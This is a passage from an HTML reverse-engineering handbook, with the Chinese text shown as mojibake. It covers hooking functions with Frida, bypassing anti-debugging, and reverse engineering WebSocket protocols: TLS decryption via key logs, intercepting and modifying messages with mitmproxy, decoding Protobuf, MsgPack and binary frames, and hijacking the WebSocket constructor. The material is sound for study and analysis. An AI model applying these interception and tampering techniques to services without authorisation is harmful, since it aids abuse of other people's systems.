<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&quot;[encrypt] å‚æ•°:&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">Memory</span><span class="p">.</span><span class="nx">readUtf8String</span><span class="p">(</span><span class="nx">args</span><span class="p">[</span><span class="mf">0</span><span class="p">]));</span>
<span class="w">    </span><span class="p">},</span>
<span class="w">    </span><span class="nx">onLeave</span><span class="o">:</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">retval</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s2">&quot;[encrypt] è¿”å›å€¼:&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">Memory</span><span class="p">.</span><span class="nx">readUtf8String</span><span class="p">(</span><span class="nx">retval</span><span class="p">));</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">});</span>
</code></pre>
      </div>

      <hr />

      <h2 id="æ€»ç»“">æ€»ç»“</h2>

      <p>åŠ¨æ€åˆ†æçš„ç²¾é«“åœ¨äºï¼š</p>

      <ol>
        <li>âœ… <strong>è°ƒç”¨æ ˆè¿½è¸ª</strong>: ä» Initiator æˆ– Call Stack æ‰¾åˆ°ä»£ç å…¥å£</li>
        <li>âœ… <strong>æ–­ç‚¹æŠ€å·§</strong>: æ¡ä»¶æ–­ç‚¹ã€Logpointã€XHR æ–­ç‚¹ã€äº‹ä»¶æ–­ç‚¹</li>
        <li>âœ… <strong>ä½œç”¨åŸŸæ£€æŸ¥</strong>: Localã€Closureã€Global ä¸‰å±‚ä½œç”¨åŸŸ</li>
        <li>âœ… <strong>æ¢é’ˆæŠ€æœ¯</strong>: å±æ€§æ‹¦æˆªã€å‡½æ•°åŠ«æŒã€Proxy ä»£ç†</li>
        <li>âœ… <strong>å¼‚æ­¥è°ƒè¯•</strong>: Async Stack Tracesã€Promise é“¾è¿½è¸ª</li>
        <li>âœ… <strong>æ€§èƒ½åˆ†æ</strong>: CPU Profileã€Memory Snapshot</li>
        <li>âœ… <strong>åè°ƒè¯•ç»•è¿‡</strong>: ç¦ç”¨æ–­ç‚¹ã€ä¿®æ”¹æ£€æµ‹ä»£ç </li>
      </ol>

      <p><strong>è®°ä½</strong>: ä¸è¦è¯•å›¾ç†è§£æ¯ä¸€è¡Œæ··æ·†ä»£ç ï¼Œè€Œæ˜¯<strong>è§‚å¯Ÿæ•°æ®æµ</strong> â€”â€” æ•°æ®ä»å“ªé‡Œæ¥ã€ç»è¿‡äº†ä»€ä¹ˆå¤„ç†ã€æœ€åå˜æˆäº†ä»€ä¹ˆã€‚</p>

      <hr />

      <h2 id="ç›¸å…³ç« èŠ‚">ç›¸å…³ç« èŠ‚</h2>

      <ul>
        <li><a href="#04-Advanced-Recipes-javascript-deobfuscation">JavaScript åæ··æ·†</a></li>
        <li><a href="#02-Tooling-browser-devtools">æµè§ˆå™¨å¼€å‘è€…å·¥å…·</a></li>
        <li><a href="#03-Basic-Recipes-hooking-techniques">Hooking æŠ€æœ¯</a></li>
        <li><a href="#03-Basic-Recipes-api-reverse-engineering">API é€†å‘ä¸é‡æ”¾æ”»å‡»</a></li>
        <li><a href="#02-Tooling-nodejs-debugging">Node.js è°ƒè¯•æŒ‡å—</a></li>
      </ul>

    </div>

    <div class="section" id="03-Basic-Recipes-websocket-reversing">
      <h2>31. WebSocket Reversing</h2>
      <h1 id="websocket-é€†å‘åˆ†æ">WebSocket é€†å‘åˆ†æ</h1>

      <h2 id="æ¦‚è¿°">æ¦‚è¿°</h2>

      <p>WebSocket (WS) æ˜¯ä¸€ç§å…¨åŒå·¥åè®®ï¼Œå¸¸ç”¨äºå³æ—¶é€šè®¯ã€è‚¡ç¥¨è¡Œæƒ…ã€åœ¨çº¿æ¸¸æˆã€å®æ—¶æ¨é€ç­‰åœºæ™¯ã€‚ä¸ HTTP ä¸åŒï¼ŒWS æ˜¯ä¸€æ¬¡æ¡æ‰‹åå»ºç«‹é•¿è¿æ¥ï¼Œåç»­æ•°æ®éƒ½æ˜¯å¸§ (Frame) çš„å½¢å¼åŒå‘ä¼ è¾“ã€‚</p>

      <p>WebSocket é€†å‘çš„æœ¬è´¨æ˜¯<strong>åè®®é€†å‘</strong> â€”â€” ææ¸…æ¥šå®ƒ"è¯´ä»€ä¹ˆè¯"ï¼ˆPayload æ ¼å¼ï¼‰ä»¥åŠ"æ€ä¹ˆè¯´è¯"ï¼ˆçŠ¶æ€æœºã€å¿ƒè·³ã€è®¤è¯ï¼‰ã€‚</p>

      <hr />

      <h2 id="1-websocket-åè®®åŸºç¡€">1. WebSocket åè®®åŸºç¡€</h2>

      <h3 id="11-è¿æ¥å»ºç«‹upgrade-handshake">1.1 è¿æ¥å»ºç«‹ï¼ˆUpgrade Handshakeï¼‰</h3>

      <p>WebSocket è¿æ¥ç”± HTTP è¯·æ±‚å‡çº§è€Œæ¥ï¼š</p>

      <p><strong>å®¢æˆ·ç«¯å‘èµ·å‡çº§è¯·æ±‚</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="nf">GET</span> <span class="nn">/chat</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">example.com</span>
<span class="na">Upgrade</span><span class="o">:</span> <span class="l">websocket</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">Upgrade</span>
<span class="na">Sec-WebSocket-Key</span><span class="o">:</span> <span class="l">dGhlIHNhbXBsZSBub25jZQ==</span>
<span class="na">Sec-WebSocket-Version</span><span class="o">:</span> <span class="l">13</span>
</code></pre>
      </div>

      <p><strong>æœåŠ¡ç«¯å“åº”</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">101</span> <span class="ne">Switching Protocols</span>
<span class="na">Upgrade</span><span class="o">:</span> <span class="l">websocket</span>
<span class="na">Connection</span><span class="o">:</span> <span class="l">Upgrade</span>
<span class="na">Sec-WebSocket-Accept</span><span class="o">:</span> <span class="l">s3pPLMBiTxaQ9kYGzzhZRbK+xOo=</span>
</code></pre>
      </div>

      <p><strong>é‡ç‚¹å‚æ•°</strong>:</p>

      <ul>
        <li><code>Sec-WebSocket-Key</code>: å®¢æˆ·ç«¯éšæœºç”Ÿæˆçš„ Base64 ç¼–ç </li>
        <li><code>Sec-WebSocket-Accept</code>: æœåŠ¡ç«¯æ ¹æ® Key è®¡ç®—çš„å“ˆå¸Œå€¼</li>
        <li><code>Sec-WebSocket-Protocol</code>: å­åè®®ï¼ˆå¦‚ <code>chat</code>, <code>mqtt</code>ï¼‰</li>
      </ul>

      <h3 id="12-å¸§ç»“æ„-frame-structure">1.2 å¸§ç»“æ„ (Frame Structure)</h3>

      <p>WebSocket æ•°æ®ä»¥å¸§çš„å½¢å¼ä¼ è¾“ï¼š</p>

      <pre><code> 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-------+-+-------------+-------------------------------+
|F|R|R|R| opcode|M| Payload len |    Extended payload length    |
|I|S|S|S|  (4)  |A|     (7)     |             (16/64)           |
|N|V|V|V|       |S|             |   (if payload len==126/127)   |
| |1|2|3|       |K|             |                               |
+-+-+-+-+-------+-+-------------+ - - - - - - - - - - - - - - - +
|     Extended payload length continued, if payload len == 127  |
+ - - - - - - - - - - - - - - - +-------------------------------+
|                               |Masking-key, if MASK set to 1  |
+-------------------------------+-------------------------------+
| Masking-key (continued)       |          Payload Data         |
+-------------------------------- - - - - - - - - - - - - - - - +
:                     Payload Data continued ...                :
+ - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - +
|                     Payload Data continued ...                |
+---------------------------------------------------------------+
</code></pre>

      <p><strong>Opcode (æ“ä½œç )</strong>:</p>

      <table>
        <thead>
          <tr>
            <th>Opcode</th>
            <th>ç±»å‹</th>
            <th>è¯´æ˜</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td>0x0</td>
            <td>Continuation</td>
            <td>åˆ†ç‰‡æ¶ˆæ¯çš„åç»­å¸§</td>
          </tr>
          <tr>
            <td>0x1</td>
            <td>Text</td>
            <td>æ–‡æœ¬æ¶ˆæ¯ï¼ˆUTF-8ï¼‰</td>
          </tr>
          <tr>
            <td>0x2</td>
            <td>Binary</td>
            <td>äºŒè¿›åˆ¶æ¶ˆæ¯</td>
          </tr>
          <tr>
            <td>0x8</td>
            <td>Close</td>
            <td>å…³é—­è¿æ¥</td>
          </tr>
          <tr>
            <td>0x9</td>
            <td>Ping</td>
            <td>å¿ƒè·³è¯·æ±‚</td>
          </tr>
          <tr>
            <td>0xA</td>
            <td>Pong</td>
            <td>å¿ƒè·³å“åº”</td>
          </tr>
        </tbody>
      </table>

      <hr />

      <h2 id="2-æŠ“åŒ…ä¸åˆ†æ">2. æŠ“åŒ…ä¸åˆ†æ</h2>

      <h3 id="21-chrome-devtools">2.1 Chrome DevTools</h3>

      <p><strong>æ­¥éª¤</strong>:</p>

      <ol>
        <li>æ‰“å¼€ Network é¢æ¿</li>
        <li>ç‚¹å‡» &#8220;WS&#8221; è¿‡æ»¤å™¨ â†’ åªæ˜¾ç¤º WebSocket è¿æ¥</li>
        <li>ç‚¹å‡»è¿æ¥åç§° â†’ æŸ¥çœ‹è¯¦ç»†ä¿¡æ¯</li>
      </ol>

      <p><strong>Messages æ ‡ç­¾é¡µ</strong>:</p>

      <ul>
        <li>ğŸŸ¢ ç»¿è‰²ç®­å¤´ = å®¢æˆ·ç«¯å‘é€ (Send)</li>
        <li>ğŸ”´ çº¢è‰²ç®­å¤´ = æœåŠ¡ç«¯æ¥æ”¶ (Receive)</li>
        <li>æ—¶é—´æˆ³ã€å¤§å°ã€Opcode</li>
      </ul>

      <p><strong>Frame åˆ†æ</strong>:</p>

      <ul>
        <li><strong>Text Frame</strong>: ç›´æ¥æ˜¾ç¤º UTF-8 æ–‡æœ¬ï¼ˆé€šå¸¸æ˜¯ JSONï¼‰</li>
        <li><strong>Binary Frame</strong>: æ˜¾ç¤ºä¸ºåå…­è¿›åˆ¶æˆ– Base64
          <ul>
            <li>å¯èƒ½æ˜¯ Protobufã€MsgPackã€è‡ªå®šä¹‰æ ¼å¼</li>
          </ul>
        </li>
      </ul>

      <p><strong>æŠ€å·§</strong>: ä¿å­˜æ¶ˆæ¯åˆ°æ–‡ä»¶</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// åœ¨ Console ä¸­æ‰§è¡Œ</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">messages</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[...</span><span class="nb">document</span><span class="p">.</span><span class="nx">querySelectorAll</span><span class="p">(</span><span class="s1">&#39;.message-list-item&#39;</span><span class="p">)];</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">messages</span><span class="p">.</span><span class="nx">map</span><span class="p">(</span><span class="nx">m</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">m</span><span class="p">.</span><span class="nx">textContent</span><span class="p">);</span>
<span class="nx">copy</span><span class="p">(</span><span class="nb">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nx">data</span><span class="p">,</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span><span class="w"> </span><span class="mf">2</span><span class="p">));</span><span class="w">  </span><span class="c1">// å¤åˆ¶åˆ°å‰ªè´´æ¿</span>
</code></pre>
      </div>

      <h3 id="22-wireshark-æŠ“åŒ…">2.2 Wireshark æŠ“åŒ…</h3>

      <p><strong>ä¼˜åŠ¿</strong>: é€‚ç”¨äºéæµè§ˆå™¨åº”ç”¨ï¼ˆæ¡Œé¢å®¢æˆ·ç«¯ã€ç§»åŠ¨ Appï¼‰</p>

      <p><strong>è¿‡æ»¤å™¨</strong>:</p>

      <pre><code>websocket
websocket.opcode == 1  // åªæ˜¾ç¤ºæ–‡æœ¬å¸§
websocket.opcode == 2  // åªæ˜¾ç¤ºäºŒè¿›åˆ¶å¸§
</code></pre>

      <p><strong>SSL/TLS è§£å¯†</strong> (å¯¹äº wss://):</p>

      <ol>
        <li>è®¾ç½®ç¯å¢ƒå˜é‡:<br />
          <div class="codehilite"><br />
            <pre><span></span><code><span class="nb">export</span><span class="w"> </span><span class="nv">SSLKEYLOGFILE</span><span class="o">=</span>~/sslkeys.log<br />
</code></pre><br />
          </div>
        </li>
      </ol>

      <ol start="2">
        <li>å¯åŠ¨åº”ç”¨ï¼ˆæµè§ˆå™¨æˆ–å®¢æˆ·ç«¯ï¼‰</li>
        <li>Wireshark é…ç½®:
          <ul>
            <li>Edit â†’ Preferences â†’ Protocols â†’ TLS</li>
            <li>(Pre)-Master-Secret log filename: <code>~/sslkeys.log</code></li>
          </ul>
        </li>
      </ol>

      <p><strong>æŸ¥çœ‹ Payload</strong>:</p>

      <ul>
        <li>å³é”®å¸§ â†’ Follow â†’ WebSocket Stream</li>
        <li>è‡ªåŠ¨è§£å¯† Masking Key</li>
      </ul>

      <h3 id="23-mitmproxy">2.3 mitmproxy</h3>

      <p><strong>ä¼˜åŠ¿</strong>: å¯ç¼–ç¨‹æ‹¦æˆªå’Œä¿®æ”¹ WebSocket æ¶ˆæ¯</p>

      <p><strong>å¯åŠ¨</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code>mitmweb<span class="w"> </span>--mode<span class="w"> </span>upstream:https://api.example.com<span class="w"> </span>--listen-port<span class="w"> </span><span class="m">8080</span>
</code></pre>
      </div>

      <p><strong>Python è„šæœ¬æ‹¦æˆª</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># ws_intercept.py</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">mitmproxy</span><span class="w"> </span><span class="kn">import</span> <span class="n">ctx</span>

<span class="k">def</span><span class="w"> </span><span class="nf">websocket_message</span><span class="p">(</span><span class="n">flow</span><span class="p">):</span>
    <span class="c1"># æ‹¦æˆª WebSocket æ¶ˆæ¯</span>
    <span class="n">message</span> <span class="o">=</span> <span class="n">flow</span><span class="o">.</span><span class="n">messages</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>

    <span class="k">if</span> <span class="n">message</span><span class="o">.</span><span class="n">from_client</span><span class="p">:</span>
        <span class="n">ctx</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[Client â†’ Server] </span><span class="si">{</span><span class="n">message</span><span class="o">.</span><span class="n">content</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
        <span class="c1"># ä¿®æ”¹æ¶ˆæ¯</span>
        <span class="k">if</span> <span class="sa">b</span><span class="s1">&#39;&quot;type&quot;:&quot;ping&quot;&#39;</span> <span class="ow">in</span> <span class="n">message</span><span class="o">.</span><span class="n">content</span><span class="p">:</span>
            <span class="n">message</span><span class="o">.</span><span class="n">content</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;{&quot;type&quot;:&quot;pong&quot;}&#39;</span>

    <span class="k">else</span><span class="p">:</span>
        <span class="n">ctx</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[Server â†’ Client] </span><span class="si">{</span><span class="n">message</span><span class="o">.</span><span class="n">content</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
</code></pre>
      </div>

      <p><strong>è¿è¡Œ</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code>mitmproxy<span class="w"> </span>-s<span class="w"> </span>ws_intercept.py
</code></pre>
      </div>

      <hr />

      <h2 id="3-åè®®è¿˜åŸ">3. åè®®è¿˜åŸ</h2>

      <h3 id="31-æ–‡æœ¬åè®®-text-frame">3.1 æ–‡æœ¬åè®® (Text Frame)</h3>

      <h4 id="json-æ ¼å¼">JSON æ ¼å¼</h4>

      <p>æœ€å¸¸è§çš„ WebSocket Payload æ ¼å¼ï¼š</p>

      <p><strong>ç¤ºä¾‹</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="p">{</span>
<span class="w">  </span><span class="nt">&quot;type&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;chat&quot;</span><span class="p">,</span>
<span class="w">  </span><span class="nt">&quot;user_id&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">123</span><span class="p">,</span>
<span class="w">  </span><span class="nt">&quot;message&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Hello World&quot;</span><span class="p">,</span>
<span class="w">  </span><span class="nt">&quot;timestamp&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1638360000</span>
<span class="p">}</span>
</code></pre>
      </div>

      <p><strong>é€†å‘æ­¥éª¤</strong>:</p>

      <ol>
        <li>è§‚å¯Ÿå¤šä¸ªæ¶ˆæ¯ï¼Œæå–å­—æ®µè§„å¾‹</li>
        <li>æ€»ç»“æ¶ˆæ¯ç±»å‹ï¼ˆ<code>type</code> å­—æ®µï¼‰</li>
        <li>ç¼–å†™ Python å®¢æˆ·ç«¯æ—¶ç›´æ¥ <code>json.loads()</code> å’Œ <code>json.dumps()</code></li>
      </ol>

      <h4 id="è‡ªå®šä¹‰åˆ†éš”ç¬¦">è‡ªå®šä¹‰åˆ†éš”ç¬¦</h4>

      <p><strong>ç¤ºä¾‹</strong>: ä½¿ç”¨ <code>|</code> åˆ†éš”</p>

      <pre><code>type|chat|user_id|123|message|Hello World
</code></pre>

      <p><strong>è§£ææ–¹æ³•</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="k">def</span><span class="w"> </span><span class="nf">parse_message</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
    <span class="n">parts</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;|&#39;</span><span class="p">)</span>
    <span class="k">return</span> <span class="p">{</span>
        <span class="n">parts</span><span class="p">[</span><span class="n">i</span><span class="p">]:</span> <span class="n">parts</span><span class="p">[</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span>
        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">parts</span><span class="p">),</span> <span class="mi">2</span><span class="p">)</span>
    <span class="p">}</span>

<span class="c1"># æµ‹è¯•</span>
<span class="n">msg</span> <span class="o">=</span> <span class="s2">&quot;type|chat|user_id|123&quot;</span>
<span class="nb">print</span><span class="p">(</span><span class="n">parse_message</span><span class="p">(</span><span class="n">msg</span><span class="p">))</span>  <span class="c1"># {&#39;type&#39;: &#39;chat&#39;, &#39;user_id&#39;: &#39;123&#39;}</span>
</code></pre>
      </div>

      <h3 id="32-äºŒè¿›åˆ¶åè®®-binary-frame">3.2 äºŒè¿›åˆ¶åè®® (Binary Frame)</h3>

      <h4 id="protobuf-protocol-buffers">Protobuf (Protocol Buffers)</h4>

      <p><strong>ç‰¹å¾</strong>:</p>

      <ul>
        <li>ç´§å‡‘çš„äºŒè¿›åˆ¶æ ¼å¼</li>
        <li>å­—æ®µæ²¡æœ‰ Key åç§°ï¼ˆåªæœ‰ Tag ç¼–å·ï¼‰</li>
        <li>å¸¸è§äº Google ç³»äº§å“ã€gRPC</li>
      </ul>

      <p><strong>è¯†åˆ«æ–¹æ³•</strong>:</p>

      <ol>
        <li>æœç´¢ JS ä»£ç ä¸­çš„ <code>proto.decode</code>ã€<code>protobuf.Reader</code></li>
        <li>æŸ¥æ‰¾ <code>.proto</code> æ–‡ä»¶ï¼ˆå¯èƒ½åœ¨ JS ä¸­åµŒå…¥æˆ–ä» API è·å–ï¼‰</li>
      </ol>

      <p><strong>é€†å‘æŠ€å·§ 1: æå– .proto å®šä¹‰</strong></p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// åœ¨æµè§ˆå™¨ Console ä¸­æœç´¢</span>
<span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kd">let</span><span class="w"> </span><span class="nx">key</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="nb">window</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">key</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s1">&#39;proto&#39;</span><span class="p">)</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="nx">key</span><span class="p">.</span><span class="nx">includes</span><span class="p">(</span><span class="s1">&#39;Proto&#39;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">key</span><span class="p">,</span><span class="w"> </span><span class="nb">window</span><span class="p">[</span><span class="nx">key</span><span class="p">]);</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>
</code></pre>
      </div>

      <p><strong>é€†å‘æŠ€å·§ 2: ä½¿ç”¨ protobuf-inspector çŒœè§£</strong></p>

      <div class="codehilite">
        <pre><span></span><code>pip<span class="w"> </span>install<span class="w"> </span>protobuf-inspector

<span class="c1"># åˆ†æäºŒè¿›åˆ¶æ•°æ®</span>
protobuf-inspector<span class="w"> </span>&lt;<span class="w"> </span>message.bin
</code></pre>
      </div>

      <p><strong>è¾“å‡ºç¤ºä¾‹</strong>:</p>

      <pre><code>1: "chat"           # Tag 1, ç±»å‹ string
2: 123              # Tag 2, ç±»å‹ int
3: 1638360000       # Tag 3, ç±»å‹ int
</code></pre>

      <p><strong>Python è§£ç </strong>ï¼ˆå·²çŸ¥ .proto å®šä¹‰ï¼‰:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">message_pb2</span>  <span class="c1"># ç”± protoc ç¼–è¯‘ç”Ÿæˆ</span>

<span class="n">data</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x0a\x04</span><span class="s1">chat</span><span class="se">\x10\x7b\x18\x80\xe0\xf3\xc6\x06</span><span class="s1">&#39;</span>
<span class="n">msg</span> <span class="o">=</span> <span class="n">message_pb2</span><span class="o">.</span><span class="n">ChatMessage</span><span class="p">()</span>
<span class="n">msg</span><span class="o">.</span><span class="n">ParseFromString</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>
</code></pre>
      </div>

      <h4 id="msgpack">MsgPack</h4>

      <p><strong>ç‰¹å¾</strong>:</p>

      <ul>
        <li>ç±»ä¼¼äºŒè¿›åˆ¶ç‰ˆçš„ JSON</li>
        <li>æ”¯æŒå¤šç§æ•°æ®ç±»å‹ï¼ˆintã€stringã€arrayã€mapï¼‰</li>
      </ul>

      <p><strong>è¯†åˆ«æ–¹æ³•</strong>: æŸ¥æ‰¾ <code>msgpack.decode</code>ã€<code>msgpack.encode</code></p>

      <p><strong>Python è§£ç </strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">msgpack</span>

<span class="n">data</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x82\xa4</span><span class="s1">type</span><span class="se">\xa4</span><span class="s1">chat</span><span class="se">\xa7</span><span class="s1">user_id</span><span class="se">\x7b</span><span class="s1">&#39;</span>
<span class="n">msg</span> <span class="o">=</span> <span class="n">msgpack</span><span class="o">.</span><span class="n">unpackb</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>  <span class="c1"># {&#39;type&#39;: &#39;chat&#39;, &#39;user_id&#39;: 123}</span>
</code></pre>
      </div>

      <p><strong>åœ¨çº¿å·¥å…·</strong>: <a href="https://sugendran.github.io/msgpack-visualizer/">MessagePack Viewer</a></p>

      <h4 id="è‡ªå®šä¹‰äºŒè¿›åˆ¶æ ¼å¼">è‡ªå®šä¹‰äºŒè¿›åˆ¶æ ¼å¼</h4>

      <p><strong>æ¡ˆä¾‹</strong>: æŸæ¸¸æˆçš„äºŒè¿›åˆ¶åè®®</p>

      <p><strong>æŠ“åŒ…ç¤ºä¾‹</strong>:</p>

      <pre><code>00 01 00 7b 00 00 01 8b 48 65 6c 6c 6f
â”‚  â”‚  â”‚     â”‚           â”‚
â”‚  â”‚  â”‚     â”‚           â””â”€ "Hello" (UTF-8)
â”‚  â”‚  â”‚     â””â”€ Timestamp (4 bytes)
â”‚  â”‚  â””â”€ User ID (2 bytes, 0x007b = 123)
â”‚  â””â”€ Message Type (1 = chat)
â””â”€ Version
</code></pre>

      <p><strong>é€†å‘æ­¥éª¤</strong>:</p>

      <ol>
        <li>å¯¹æ¯”å¤šä¸ªæ¶ˆæ¯ï¼Œæ‰¾å‡ºå›ºå®šå­—æ®µä½ç½®</li>
        <li>æ ¹æ®æ•°å€¼èŒƒå›´çŒœæµ‹å­—æ®µç±»å‹ï¼ˆuint8, uint16, uint32ï¼‰</li>
        <li>ç¼–å†™è§£æå™¨</li>
      </ol>

      <p><strong>Python è§£æ</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">struct</span>

<span class="k">def</span><span class="w"> </span><span class="nf">parse_custom_protocol</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
    <span class="n">version</span><span class="p">,</span> <span class="n">msg_type</span><span class="p">,</span> <span class="n">user_id</span><span class="p">,</span> <span class="n">timestamp</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s1">&#39;&gt;BBHI&#39;</span><span class="p">,</span> <span class="n">data</span><span class="p">[:</span><span class="mi">8</span><span class="p">])</span>
    <span class="n">message</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">8</span><span class="p">:]</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>

    <span class="k">return</span> <span class="p">{</span>
        <span class="s1">&#39;version&#39;</span><span class="p">:</span> <span class="n">version</span><span class="p">,</span>
        <span class="s1">&#39;type&#39;</span><span class="p">:</span> <span class="n">msg_type</span><span class="p">,</span>
        <span class="s1">&#39;user_id&#39;</span><span class="p">:</span> <span class="n">user_id</span><span class="p">,</span>
        <span class="s1">&#39;timestamp&#39;</span><span class="p">:</span> <span class="n">timestamp</span><span class="p">,</span>
        <span class="s1">&#39;message&#39;</span><span class="p">:</span> <span class="n">message</span>
    <span class="p">}</span>

<span class="c1"># æµ‹è¯•</span>
<span class="n">data</span> <span class="o">=</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="s1">&#39;00 01 00 7b 00 00 01 8b 48656c6c6f&#39;</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="n">parse_custom_protocol</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>
</code></pre>
      </div>

      <hr />

      <h2 id="4-hook-websocket">4. Hook WebSocket</h2>

      <h3 id="41-åŠ«æŒ-websocket-æ„é€ å‡½æ•°">4.1 åŠ«æŒ WebSocket æ„é€ å‡½æ•°</h3>

      <p>åœ¨é¡µé¢åŠ è½½å‰æ³¨å…¥è„šæœ¬ï¼ˆé€šè¿‡ Tampermonkey æˆ–æµè§ˆå™¨æ‰©å±•ï¼‰ï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="p">(</span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">_WebSocket</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">window</span><span class="p">.</span><span class="nx">WebSocket</span><span class="p">;</span>
<span class="w">    </span><span class="nb">window</span><span class="p">.</span><span class="nx">WebSocket</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">url</span><span class="p">,</span><span class="w"> </span><span class="nx">protocols</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[WS] è¿æ¥:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">url</span><span class="p">);</span>

<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">ws</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nx">_WebSocket</span><span class="p">(</span><span class="nx">url</span><span class="p">,</span><span class="w"> </span><span class="nx">protocols</span><span class="p">);</span>

<span class="w">        </span><span class="c1">// Hook send æ–¹æ³•</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">_send</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">ws</span><span class="p">.</span><span class="nx">send</span><span class="p">;</span>
<span class="w">        </span><span class="nx">ws</span><span class="p">.</span><span class="nx">send</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[WS Send]&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">data</span><span class="p">);</span>
